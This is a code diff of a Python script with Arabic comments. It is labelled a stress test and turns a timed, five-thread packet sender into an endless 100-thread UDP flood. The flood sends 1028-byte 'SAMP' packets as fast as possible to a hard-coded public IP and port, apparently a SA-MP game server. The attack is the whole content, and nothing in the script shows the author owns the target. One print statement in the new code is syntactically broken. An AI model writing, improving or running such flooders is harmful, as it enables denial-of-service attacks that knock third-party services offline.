@@ -1,52 +1,48 @@
 import socket
-import time
-import random
 import threading
+import sys
 
-TARGET_IP = "94.23.168.153"
-TARGET_PORT = 2343
-DURATION = 300  # مدة الاختبار بالثواني
-THREADS = 5
+# معلومات الهدف
+TARGET_IP = "89.46.1.130"  # IP السيرفر
+TARGET_PORT = 7000        # المنفذ
+THREADS_COUNT = 100       # عدد الخيوط (كلما زاد الرقم، زاد الضغط على الشبكة والـ CPU)
 
-def smart_stress_worker(end_time):
+def stress_worker():
+    # إنشاء اتصال UDP
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
-    # أنواع مختلفة من البايتات لاختبار استجابة معالج السيرفر لعمليات التحليل (Parsing)
-    payloads = [
-        # حزمة استعلام معدلة بلغة غير قياسية أو رموز وهمية
-        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'x' * 50,
-        # حزمة بيانات مبعثرة لاختبار الـ Exception Handling في السيرفر
-        b'\x00\xFF\x00\xFF' + b'SAMP' + bytes([random.randint(0, 255) for _ in range(20)]),
-        # استعلام متكرر برمز مختلف
-        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'p'
-    ]
+    # حمولة (Payload) بحجم أكبر وبنية تجبر المعالج على محاولة معالجتها وتحليلها
+    payload = b'SAMP' + b'\xFF' * 1024
     
-    count = 0
-    while time.time() < end_time:
+    print(طبدأ تشغيل خيط الضغط...")
+    while True:
         try:
-            # اختيار نمط عشوائي من الحزم لاختبار استجابة الـ Parser
-            payload = random.choice(payloads)
+            # إرسال الحزم بأقصى سرعة ممكنة بدون تأخير (No Sleep)
             client.sendto(payload, (TARGET_IP, TARGET_PORT))
-            count += 1
-        except Exception:
+        except Exception as e:
+            # تجاهل الأخطاء البسيطة للاستمرار في الإرسال دون توقف
             pass
-            
-    client.close()
 
-def run_test():
-    end_time = time.time() + DURATION
-    print(f"جاري بدء اختبار تحليل الحزم على {TARGET_IP}:{TARGET_PORT}...")
+def main():
+    print(f"=== بدء اختبار الضغط الشامل على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيط ===")
+    print("اضغط Ctrl+C لإيقاف الاختبار يدوياً.")
     
     threads = []
-    for _ in range(THREADS):
-        t = threading.Thread(target=smart_stress_worker, args=(end_time,))
+    
+    # تشغيل الخيوط بالتوازي
+    for _ in range(THREADS_COUNT):
+        t = threading.Thread(target=stress_worker)
+        t.daemon = True
         threads.append(t)
         t.start()
         
-    for t in threads:
-        t.join()
-        
-    print("انتهى الاختبار بنجاح.")
+    try:
+        # إبقاء البرنامج يعمل لمواصلة الضغط
+        while True:
+            threading.Event().wait(1)
+    except KeyboardInterrupt:
+        print("\nتم إيقاف الاختبار بواسطة المستخدم.")
+        sys.exit(0)
 
 if __name__ == "__main__":
-    run_test()
+    main()
